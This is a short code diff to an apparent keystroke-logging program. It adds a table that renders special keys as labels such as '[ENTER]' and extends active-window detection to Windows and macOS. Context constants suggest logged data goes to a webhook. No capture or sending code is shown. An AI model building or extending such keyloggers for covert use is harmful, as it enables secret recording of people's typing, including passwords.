@@ -33,6 +33,29 @@ WEBHOOK_TIMEOUT_SECS = 5
 WINDOW_CHECK_INTERVAL_SECS = 0.5
 LISTENER_JOIN_TIMEOUT_SECS = 1.0
 
+SPECIAL_KEYS: dict[Key,
+                   str] = {
+                       Key.space: "[SPACE]",
+                       Key.enter: "[ENTER]",
+                       Key.tab: "[TAB]",
+                       Key.backspace: "[BACKSPACE]",
+                       Key.delete: "[DELETE]",
+                       Key.shift: "[SHIFT]",
+                       Key.shift_r: "[SHIFT]",
+                       Key.ctrl: "[CTRL]",
+                       Key.ctrl_r: "[CTRL]",
+                       Key.alt: "[ALT]",
+                       Key.alt_r: "[ALT]",
+                       Key.cmd: "[CMD]",
+                       Key.cmd_r: "[CMD]",
+                       Key.esc: "[ESC]",
+                       Key.up: "[UP]",
+                       Key.down: "[DOWN]",
+                       Key.left: "[LEFT]",
+                       Key.right: "[RIGHT]",
+                   }
+
+
 class KeyType(Enum):
     """
     Categorizes keystrokes as character, special, or unknown
@@ -101,6 +124,10 @@ class WindowTracker:
         """
         system = platform.system()
 
+        if system == WINDOWS:
+            return WindowTracker._get_windows_window()
+        if system == DARWIN:
+            return WindowTracker._get_macos_window()
         if system == LINUX:
             return WindowTracker._get_linux_window()
 
